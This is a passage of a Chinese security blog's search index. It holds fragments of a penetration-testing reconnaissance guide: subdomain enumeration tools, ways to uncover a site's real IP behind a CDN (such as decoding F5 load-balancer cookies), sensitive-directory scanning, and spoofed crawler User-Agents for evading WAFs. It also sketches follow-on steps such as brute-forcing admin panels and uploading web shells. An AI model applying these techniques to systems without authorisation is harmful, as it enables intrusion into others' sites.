","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:18:0","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#5自身泄漏"},{"categories":["学习"],"content":" 6、Github泄露","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:19:0","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#6github泄露"},{"categories":["学习"],"content":" 7、Google Hacking搜索引擎查询都会做一些反制爬虫的手段，目前使用google去采集的方法是调用google的官方API，或者调用bing的API去辅助采集。 ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:20:0","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#7google-hacking"},{"categories":["学习"],"content":" 8、在线子域名查询http://sbd.ximcx.cn/ http://tool.chinaz.com/subdomain/ ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:21:0","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#8在线子域名查询"},{"categories":["学习"],"content":" 9、子域名枚举爆破向DNS服务器(如8.8.8.8和8.8.4.4)请求字典里面的子域名，看返回的数据里面是否有记录，如果有则说明这是一个存在的子域名。比如说，向114.114.114.114定向请求www.qq.com的记录，返回了一条A记录指向182.254.34.74，就说明存在这个域名；相应的请求wooyun.qq.com并没有相应的记录返回，这就说明没有这个域名存在。 *注：一般只使用同一套主、副DNS，即8.8.8.8和8.8.4.4，DNS服务器不宜混搭，否则容易出现大量误报* 发包可以用第三方库，比如说lijiejie的subDomainBrute使用了dnspython这个包。使用第三方包的确好，但是免不了一层封装和不能很好地理解DNS报文协议，也可能会降低一定的效率，和没有解决泛解析的好办法。 泛解析这个问题的解决方法很简单，向DNS请求*记录，然后把枚举子域名回来的记录和*的记录比对，如果相同则直接排除\\。但是实际上，如果使用第三方包，不自己造轮子的话，是无法实现这个的。因为有些域名的*记录是CNAME，而第三方包只能解析出IP却不会返回出CNAME给你。举个例子，以www.baidu.com，大家ping一下都知道会跳转到www.a.shifen.com，这就是一个CNAME记录，但是我们用第三方包只能获得最后解析出来的ip。 也就是说，如果一个域名他的泛解析是一个CNAME记录而且这又是一个CDN域名(恰巧这个又不少)，那么不是自己定制的dns查询函数，一般都会出现大量泛解析误报。这就有点像是灯下黑，知道了怎么做就可以了，却一直没有解决的办法。 如果要自己定制的话需要研究一下DNS报文协议，这里引用两张图片做简要分析 这是向DNS请求部分的： 这是DNS服务器回传的报文： 只需要按照这个协议的格式做正则提取即可获得我们想要的信息，A记录的是固定的正则，CNAME记录需要嵌套一层正则才能获取。 这里提供几个测试域名，都有CNAME记录作为泛解析的。 alitrip.com taobao.com tmall.com 52pk.com focus.cn ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:22:0","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#9子域名枚举爆破"},{"categories":["学习"],"content":" 9.1、OneForAll下载地址：https://github.com/shmilylty/OneForAll 目前支持一键收集：子域、子域常用端口、子域Title、子域状态、子域服务器等 020_信息收集_子域名OneForAll ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:22:1","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#91oneforall"},{"categories":["学习"],"content":" 9.2、subDomainBrute工具地址： https://github.com/lijiejie/subDomainsBrute 高并发的DNS暴力枚举工具 020_信息收集_子域名subDomainsBrute ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:22:2","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#92subdomainbrute"},{"categories":["学习"],"content":" 9.3、LayerLayer子域名挖掘机是一款域名查询工具，可提供网站子域名查询服务；拥有简洁的界面、简单的操作模式，支持服务接口、暴力搜索、同服挖掘三种模式，支持打开网站、复制域名、复制IP、复制CDN、导出域名、导出IP、导出域名+IP、导出域名+IP+WEB服务器以及导出存活网站！ 通过查看WEB服务器信息，筛选版本比较低的服务器（win2003+iis6.0），查看每个子域名是否开启常见的端口（3389、3306、21端口等），利用爆破工具进行枚举，会达到事半功倍的效果。 ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:22:3","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#93layer"},{"categories":["学习"],"content":" 9.4、FuzSubhttps://github.com/DavexPro/FuzSub ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:22:4","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#94fuzsub"},{"categories":["学习"],"content":" 9.5、Fiercehttps://github.com/davidpepper/fierce-domain-scanner ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:22:5","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#95fierce"},{"categories":["学习"],"content":" 9.6、御剑","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:22:6","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#96御剑"},{"categories":["学习"],"content":" 9.7、wydomain","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:22:7","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#97wydomain"},{"categories":["学习"],"content":" 9.8、orangescan","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:22:8","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#98orangescan"},{"categories":["学习"],"content":" 9.9、DNSRecon","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:22:9","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#99dnsrecon"},{"categories":["学习"],"content":" 9.10、K8","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:22:10","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#910k8"},{"categories":["学习"],"content":" 四、IP信息收集首先，我们要判断该域名是否存在CDN的情况，我们可以去在线CDN查询网站：http://ping.chinaz.com/ 。如果查询出的ip数量大于一个的话，则说明该ip地址不是真实的服务器地址。以我的经验来看，如果是2个或者3个，并且这几个地址是同一地区的不同运营商的话，则很有可能这几个地址是服务器的出口地址，该服务器在内网中，通过不同运营商NAT映射供互联网访问，同时采用几个不同的运营商可以负载均衡和热备份。如果是多个ip地址，并且这些ip地址分布在不同地区的话，则基本上可以断定就是采用了CDN了。 ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:23:0","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#四ip信息收集"},{"categories":["学习"],"content":" 1、CDN概念内容分发网络(content delivery network或content distribution network,缩写作CDN)指一种通过互联网互相连接的电脑网络系统,利用最靠近每位用户的服务器,更快、更可靠地将音乐、图片、视频、应用程序及其他文件发送给用户,来提供高性能、可扩展性及低成本的网络内容传递给用户，主要就是通过多个不同节点加快网站的访问速度。 ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:24:0","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#1cdn概念"},{"categories":["学习"],"content":" 2、判断是否真实IP","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:25:0","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#2判断是否真实ip"},{"categories":["学习"],"content":" 2.1、nslookup命令端 意义：用了CDN的会返回多个IP地址 在线工具 http://tools.bugscaner.com/nslookup/ http://tool.chinaz.com/nslookup/ ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:25:1","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#21nslookup"},{"categories":["学习"],"content":" 2.2、多地ping看IP是否一致，在线工具： http://ping.chinaz.com/、 http://ping.aizhan.com/、 ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:25:2","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#22多地ping"},{"categories":["学习"],"content":" 2.3、IP反查反查IP有多个域名,那IP多半不是真实IP ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:25:3","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#23ip反查"},{"categories":["学习"],"content":" 3、绕CDN找真实IP","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:26:0","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#3绕cdn找真实ip"},{"categories":["学习"],"content":" 3.1、子域名CDN不便宜，所以很多站都是主站做了CDN，而很多小站没做CDN，所以可以通过上面收集到的子域名查询到真实的IP地址，进而知道网站真实IP的C段了。 ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:26:1","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#31子域名"},{"categories":["学习"],"content":" 3.2、历史DNS解析记录查询未使用CDN前的DNS服务器解析记录，查看IP与域名绑定的历史记录，可能会存在使用CDN前的记录 https://dnsdb.io/zh-cn/ DNS查询 https://x.threatbook.cn/ 微步在线 http://toolbar.netcraft.com/site_report?url= 在线域名信息查询 http://viewdns.info/ DNS、IP等查询 https://tools.ipip.net/cdn.php CDN查询IP ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:26:2","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#32历史dns解析记录"},{"categories":["学习"],"content":" 3.3、邮件服务器大部分网站会有注册,订阅,找回密码的功能会发送邮件,因为邮件系统一般都在内部，所以就可以通过邮箱获得真实的IP，邮件头信息中会有真实IP ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:26:3","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#33邮件服务器"},{"categories":["学习"],"content":" 3.4、信息泄漏有些网站会有phpinfo页面,一些debug模式不关等信息泄漏问题，上面会有真实IP ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:26:4","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#34信息泄漏"},{"categories":["学习"],"content":" 3.5、网络空间搜索引擎通过shadan、fofa等搜索引擎，通过对目标 网站的特征进行搜索，很多时候可以获取网站的真实IP ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:26:5","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#35网络空间搜索引擎"},{"categories":["学习"],"content":" 3.6、利用SSL证书查询https://censys.io/certificates/ ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:26:6","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#36利用ssl证书查询"},{"categories":["学习"],"content":" 3.7、国外访问一般的站点在国内可能会有CDN，但是在国外的用户覆盖率比较低，所以通过国外的节点进行请求往往能获取真实IP ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:26:7","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#37国外访问"},{"categories":["学习"],"content":" 3.8、LTM解码法当服务器使用F5 LTM做负载均衡时,通过对set-cookie关键字的解码真实ip也可被获取,例如：Set-Cookie: BIGipServerpool_8.29_8030=487098378.24095.0000,先把第一小节的十进制数即487098378取出来,然后将其转为十六进制数1d08880a,接着从后至前,以此取四位数出来,也就是0a.88.08.1d,最后依次把他们转为十进制数10.136.8.29,也就是最后的真实ip。 ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:26:8","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#38ltm解码法"},{"categories":["学习"],"content":" 五、基本目录、敏感目录及文件由于发布网站时，服务器配置问题，导致目录浏览功能打开，从而引起信息泄露，造成安全隐患。在信息收集过程中，需要收集的敏感目录/文件信息包括： 1.robots.txt 2.crossdomin.xml 3.sitemap.xml 4.后台目录 5.网站安装包 6.网站上传目录 7.mysql管理页面 8.phpinfo 9.网站文本编辑器 10.测试文件 11.网站备份文件(.rar、zip、.7z、.tar.gz、.bak) 12.DS_Store 文件 13.vim编辑器备份文件(.swp) 14.WEB—INF/web.xml文件 目录扫描对应信息收集来说特为重要，比如robots文件当中就可能泄露网站的后台或者CMS信息等，安装包中便泄露了网站的源码，phpinfo泄露了服务器的一些配置信息，编辑器、上传页面便可以进行利用相关的漏洞进行渗透，mysql、后台管理页面可以进行枚举爆破来尝试登陆进行下一步的安全测试。 扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏 后台目录：弱口令，万能密码，爆破 安装包：获取数据库信息，甚至是网站源码 上传目录：截断、上传图片马等 mysql管理接口：弱口令、爆破，万能密码，然后脱裤，甚至是拿到shell 安装页面 ：可以二次安装进而绕过 phpinfo：会把你配置的各种信息暴露出来 编辑器：fck、ke、等 iis短文件利用：条件比较苛刻 windows、apache等 robots.txt 文件是专门针对搜索引擎机器人robot 编写的一个纯文本文件。我们可以在这个文件中指定网站中不想被robot访问的目录。这样，我们网站的部分或全部内容就可以不被搜索引擎收录了，或者让搜索引擎只收录指定的内容。因此我们可 以利用robots.txt让Google的机器人访问不了我们网站上的重要文件，GoogleHack的威胁也就不存在了。 假如编写的robots.txt文件内容如下： User-agent: * Disallow: /data/ Disallow: /db/ Disallow: /admin/ Disallow: /manager/ Allow:/images/ 其中“Disallow”参数后面的是禁止robot收录部分的路径，例如我们要让robot禁止收录网站目录下的“data”文件夹，只需要在Disallow参数后面加上 /data/ 即可。如果想增加其他目录，只需按此格式继续添加。文件编写完成后将其上传到网站的根目录，就可以让网站远离Google Hack了。 虽然robots文件目的是让搜索蜘蛛不爬取想要保护的页面，但是如果我们知道了robots文件的内容的话，我们就可以知道目标网站哪些文件夹不让访问，从侧面说明这些文件夹是很重要的了。 ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:27:0","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#五基本目录敏感目录及文件"},{"categories":["学习"],"content":" 1、dirsearch工具地址：https://github.com/maurosoria/dirsearch 002_目录信息_dirsearch ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:28:0","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#1dirsearch"},{"categories":["学习"],"content":" 2、dirbuster工具地址：https://downloads.sourceforge.net/project/dirbuster/DirBuster%20%28jar%20%2B%20lists%29/1.0-RC1/DirBuster-1.0-RC1.zip?r=https%3A%2F%2Fsourceforge.net%2Fprojects%2Fdirbuster%2Ffiles%2FDirBuster%2520%2528jar%2520%252B%2520lists%2529%2F1.0-RC1%2F\u0026ts=1491212671\u0026use_mirror=jaist 当使用扫描工具对站点进行扫描，网站存在WAF后，会给我们的工具进行拦截，这时候我们需要修改User Agent值来绕过WAF的拦截，而DirBuster这款扫描工具便可以修改User Agent值 Mozilla/5.0 (compatible; Baiduspider/2.0; http://www.baidu.com/search/spider.html) 百度蜘蛛抓取欺骗 Mozilla/5.0 (compatible; Googlebot/2.1; http://www.google.com/bot.html) 谷歌蜘蛛抓取欺骗 Firefox 3.6 Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.2.8;baidu Transcoder) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729) 百度转码浏览欺骗 Chrome Mozilla/5.0 (en-us) AppleWebKit/534.14 (KHTML, like Gecko; Google Wireless Transcoder) Chrome/9.0.597 Safari/534.14 谷歌转码浏览欺骗 ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:29:0","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#2dirbuster"},{"categories":["学习"],"content":" 3、7kbscan工具：https://github.com/7kbstorm/7kbscan-WebPathBrute ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:30:0","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#37kbscan"},{"categories":["学习"],"content":" 4、Webrobot","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:31:0","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#4webrobot"},{"categories":["学习"],"content":" 5、御剑","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:32:0","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#5御剑"},{"categories":["学习"],"content":" 